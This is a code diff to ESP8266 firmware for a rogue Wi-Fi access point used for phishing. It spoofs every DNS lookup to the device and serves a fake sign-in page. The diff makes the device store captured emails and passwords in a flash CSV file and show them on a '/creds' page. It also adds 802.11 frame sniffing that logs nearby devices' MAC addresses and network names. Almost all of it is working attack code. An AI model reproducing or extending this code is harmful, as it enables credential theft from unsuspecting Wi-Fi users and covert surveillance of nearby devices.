@@ -1,6 +1,8 @@
 #include <ESP8266WiFi.h>
 #include <DNSServer.h> 
 #include <ESP8266WebServer.h>
+#include "./esppl_functions.h"
+
 #include <FS.h>   // SPIFFS
 
 // User configuration
@@ -19,9 +21,117 @@ const byte DNS_PORT = 53;
 const byte TICK_TIMER = 1000;
 IPAddress APIP(172, 0, 0, 1); // Gateway
 
-String Credentials="";
 unsigned long bootTime=0, lastActivity=0, lastTick=0, tickCtr=0;
 DNSServer dnsServer; ESP8266WebServer webServer(80);
+
+void setup() {
+    delay(500);
+    Serial.begin(115200);
+
+    // init, scan for 30 sec, run rogue AP
+    esppl_init(cb);
+
+    WiFi.mode(WIFI_OFF); wifi_promiscuous_enable(true);
+    wifiRecon();
+    
+    SPIFFS.begin(); 
+    bootTime = lastActivity = millis();
+
+    Serial.println(); Serial.println("Starting Rogue WiFi AP \""+(String) SSID_NAME+"\"");
+    WiFi.mode(WIFI_AP);
+    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
+    WiFi.softAP(SSID_NAME);
+
+    Serial.print("Initiating Web Server at 172.0.0.1 ...");
+    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
+    webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); });
+    webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
+    webServer.on("/recon",[]() { webServer.send(HTTP_CODE, "text/html", recon()); });
+    webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
+    webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
+    webServer.begin();
+    Serial.println(" done!");
+    
+    fileSetup();
+}
+
+
+void loop() { 
+    if ((millis()-lastTick)>TICK_TIMER) { lastTick=millis(); } 
+    dnsServer.processNextRequest(); webServer.handleClient(); 
+    delay(0);
+}
+
+// promiscuous mode callback
+
+void cb(esppl_frame_info *info) {
+
+  Serial.print("\n");
+  Serial.print("FT: ");  
+  Serial.print((int) info->frametype);
+  Serial.print(" FST: ");  
+  Serial.print((int) info->framesubtype);
+  Serial.print(" SRC: ");
+  for (int i = 0; i < 6; i++) Serial.printf("%02x", info->sourceaddr[i]);
+  Serial.print(" DEST: ");
+  for (int i = 0; i < 6; i++) Serial.printf("%02x", info->receiveraddr[i]);
+  Serial.print(" RSSI: ");
+  Serial.print(info->rssi);
+  Serial.print(" SEQ: ");
+  Serial.print(info->seq_num);
+  Serial.print(" CHNL: ");
+  Serial.print(info->channel);
+  if (info->ssid_length > 0) {
+    Serial.print(" SSID: ");
+    for (int i = 0; i < info->ssid_length; i++) Serial.print((char) info->ssid[i]);    
+  }
+
+}
+
+/***** DEFAULT FILE SETUP *****/
+
+void fileSetup() {
+
+    // check if creds.csv & recon.csv exists
+    // if not, create the files and append csv headers
+    Serial.println("\nSetting up default files...");
+    if (!SPIFFS.exists("/creds.csv")) {
+        Serial.println("Database creds.csv not found, creating new file.");
+        File tmpCreds = SPIFFS.open("/creds.csv", "w");
+        tmpCreds.println("EMAIL,PASSWORD");
+        tmpCreds.close();
+    }
+    else { Serial.println("Database creds.csv found!"); Serial.println("Access credentials at 172.0.0.1/creds");}    
+
+}
+
+/***** GATHER WIFI RECON *****/
+
+void wifiRecon() {
+
+    unsigned long interval = 5000; // 30 seconds
+    unsigned long currTime = millis();
+    unsigned long prevTime = millis();
+
+    Serial.println("Starting recon for 30 seconds:");
+        // while () {    
+            esppl_sniffing_start();
+
+            while (currTime - prevTime < interval) { // gather recon for 30 seconds, save to recon.csv
+                currTime = millis();
+                for (int i = 1; i < 15; i++ ) {
+                    esppl_set_channel(i);
+                    while (esppl_process_frames()) {
+                        //
+                    }
+                }
+            }  
+        // }
+    Serial.println("Exiting recon");
+    
+}
+
+/***** WEB SERVER *****/
 
 String input(String argName) {
   String a=webServer.arg(argName);
@@ -52,7 +162,7 @@ String header(String t) {
 
 // read credentials from csv
 String creds() {
-    String credHTML = "<table>";
+    String credHTML = header(PASS_TITLE) + "<html><body> <style>td {border: 1px solid #dddddd; text-align: left; padding: 8px 20px;} table {border-collapse: collapse; width:100%;}</style><table>";
     
     // read csv file and construct html string 
     Serial.println("Reading creds.csv database");
@@ -71,13 +181,10 @@ String creds() {
         credHTML+="</tr>";
 
     }
-    credHTML+="</table>";
+    credHTML+="</table></body></html><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
     credDB.close();
-    
+
     return credHTML;
-    // Serial.println(credHTML);
-    
-//   return header(PASS_TITLE) + "<ol>" + Credentials + "</ol><br><center><p><a style=\"color:blue\" href=/>Back to Index</a></p><p><a style=\"color:blue\" href=/clear>Clear passwords</a></p></center>" + footer();
 }
 
 String index() {
@@ -86,8 +193,13 @@ String index() {
     "<b>Password:</b> <center><input type=password name=password></input><input type=submit value=\"Sign in\"></form></center>" + footer();
 }
 
+String recon() {
+    String reconHTML;
+
+    return reconHTML;
+}
+
 // process receieved credentials
-// 
 String posted() {
     String email=input("email");
     String password=input("password");
@@ -108,94 +220,14 @@ String posted() {
         Serial.println("File write failed");
     }
 
-    Credentials="<li>Email: <b>" + email + "</b></br>Password: <b>" + password + "</b></li>" + Credentials;
-
     return header(POST_TITLE) + POST_BODY + footer();
 }
 
+// clear csv database
 String clear() {
-  String email="<p></p>"; 
-  String password="<p></p>";
-  Credentials="<p></p>";
-  return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
-}
+    File credDB = SPIFFS.open("/creds.csv", "w");
+    credDB.println("EMAIL,PASSWORD");
+    credDB.close();
 
-void BLINK() { // The internal LED will blink 5 times when a password is received.
-  int count = 0;
-  while(count < 5){
-    digitalWrite(BUILTIN_LED, LOW);
-    delay(500);
-    digitalWrite(BUILTIN_LED, HIGH);
-    delay(500);
-    count = count + 1;
-  }
-}
-
-void setup() {
-    Serial.begin(115200);
-    SPIFFS.begin(); 
-
-    bootTime = lastActivity = millis();
-
-    Serial.println("Starting WiFi AP...");
-    WiFi.mode(WIFI_AP);
-    WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
-    WiFi.softAP(SSID_NAME);
-
-    Serial.println("Starting Web Server...");
-    dnsServer.start(DNS_PORT, "*", APIP); // DNS spoofing (Only HTTP)
-    webServer.on("/post",[]() { webServer.send(HTTP_CODE, "text/html", posted()); BLINK(); });
-    webServer.on("/creds",[]() { webServer.send(HTTP_CODE, "text/html", creds()); });
-    webServer.on("/clear",[]() { webServer.send(HTTP_CODE, "text/html", clear()); });
-    webServer.onNotFound([]() { lastActivity=millis(); webServer.send(HTTP_CODE, "text/html", index()); });
-    webServer.begin();
-
-    fileSetup();
-
-    pinMode(BUILTIN_LED, OUTPUT);
-    digitalWrite(BUILTIN_LED, HIGH);
-}
-
-
-void loop() { 
-    if ((millis()-lastTick)>TICK_TIMER) { lastTick=millis(); } 
-    dnsServer.processNextRequest(); webServer.handleClient(); 
-    delay(0);
-}
-
-
-/** DEFAULT FILE SETUP **/
-void fileSetup() {
-    // check if creds.csv & recon.csv exists
-    // if not, create the files and append csv headers
-
-    if (!SPIFFS.exists("/creds.csv")) {
-        Serial.println("\nDatabase creds.csv not found, creating new file.");
-        File tmpCreds = SPIFFS.open("/creds.csv", "w");
-        tmpCreds.println("email,password");
-        tmpCreds.close();
-    }
-    else {
-        Serial.println("\nDatabase creds.csv found! Reading creds:");
-        File tmpCreds = SPIFFS.open("/creds.csv", "r");
-        while (tmpCreds.available()) {
-            Serial.write(tmpCreds.read());
-        }
-        tmpCreds.close();
-    }    
-
-    // if (!SPIFFS.exists("/recon.csv")) {
-    //     Serial.println("\nDatabase creds.csv not found, creating new file.");
-    //     File tmpCreds = SPIFFS.open("/creds.csv", "w");
-    //     tmpCreds.println("email,password");
-    //     tmpCreds.close();
-    // }
-    // else {
-    //     Serial.println("\nDatabase creds.csv found! Reading creds:");
-    //     File tmpCreds = SPIFFS.open("/creds.csv", "r");
-    //     while (tmpCreds.available()) {
-    //         Serial.write(tmpCreds.read());
-    //     }
-    //     tmpCreds.close();
-    // }   
+    return header(CLEAR_TITLE) + "<div><p>The credentials list has been reset.</div></p><center><a style=\"color:blue\" href=/>Back to Index</a></center>" + footer();
 }
